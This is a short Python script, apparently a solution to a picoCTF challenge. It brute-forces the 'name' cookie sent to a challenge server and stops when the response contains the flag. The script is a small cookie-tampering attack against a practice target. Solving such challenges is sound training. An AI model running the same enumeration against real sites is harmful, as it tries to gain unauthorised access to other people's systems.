import requests

url = 'http://mercury.picoctf.net:17781/check'

for i in range(100):
    print(i)
    cookies = dict(name=str(i))
    res = requests.get(url, cookies=cookies)
    if 'picoCTF' in res.text:
        print(res.text)
        break